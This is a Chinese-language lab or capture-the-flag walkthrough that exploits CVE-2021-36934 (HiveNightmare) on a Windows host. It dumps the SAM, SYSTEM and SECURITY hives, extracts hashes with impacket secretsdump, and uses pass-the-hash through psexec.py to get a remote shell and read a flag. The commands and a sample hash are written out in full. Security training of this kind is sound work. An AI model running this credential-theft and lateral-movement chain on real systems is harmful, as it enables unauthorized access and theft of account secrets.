---

##### 任务14：Hash提权(T - 1068利用漏洞进行权限提升)

查看当前用户信息，检测当前主机是否容易受到攻击：

```
icacls C:\windows\system32\config\sam
```

![image-20220621092918571044-1655795852557384.png](img/Hash提权.assets/18dead33303338f01d6c36045acaab6e.png)

输出`BUILTIN\Users:(I)(RX)`表示该系统易受攻击。

将`Win10`主机`C:\Users\Administrator\Desktop\工具\exp\CVE-2021-36934`目录下的`HiveNightmare.exe`文件复制粘贴至远程主机`192.168.2.150`的桌面中：

![image-20220621094338675370-1655795854024724.png](img/Hash提权.assets/a7bd523679ab9cfedac574df242d44e1.png)

命令行中执行命令：

```
cd Desktop

HiveNightmare.exe
```

![image-20220621094436917061-1655795856256429.png](img/Hash提权.assets/91b546bc005bfb89e931a75cbccb6747.png)

桌面出现三个文件：

![image-20220621094510481340-1655795857734125.png](img/Hash提权.assets/be5518667a79325770fb7e80701fe01f.png)

将这三个文件复制粘贴至`Win10`主机的`C:\Users\Administrator\Desktop\工具\内网渗透\impacket-master\impacket-master\examples`目录下，在该目录下打开命令行执行命令：

```
python3 secretsdump.py -sam SAM-2022-06-20 -system SYSTEM-2022-06-20 -security SECURITY-2022-06-20 LOCAL

##SAM-2022-06-20、SYSTEM-2022-06-20、SECURITY-2022-06-20为生成的文件名，请以实际情况进行填写。
```

![image-20220621094953535733-1655795859221117.png](img/Hash提权.assets/b7461fc1b77bd07a88045779e49f0ac7.png)

获取到密码hash：

![image-20220621095050454699-1655795860714808.png](img/Hash提权.assets/5db694fc41624161e873371fba5ea401.png)

再执行命令进行横向移动：（需要在WSL上面运行，并且加ProxyChains4）

```
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5d3d0d5e35d5b0c22f7617f472c859c0 administrator@192.168.2.150 cmd.exe
```

![image-20220621100706837425-1655795862184879.png](img/Hash提权.assets/a8132fdd9dedd49046c1033d7790de46.png)

查看当前权限：

![image-20220621100734010209-1655795863666626.png](img/Hash提权.assets/d107ca17f42f185f11f2c4de9caf6d00.png)

查看flag：

```
cd C:\

dir /s /b flag.txt
```

![image-20220621100835779144-1655795865154522.png](img/Hash提权.assets/7b82a20b6103e8f799dfcb02795e41a5.png)

查看flag（若无回显可按几次回车）：

![image-20220621100909958780-1655795866635535.png](img/Hash提权.assets/04e4d0fd20b1551fc13a77e7c6364d13.png)

```
flag{915C-0005-59BA-73EF-09D0-6E35-AA2A-A088}
```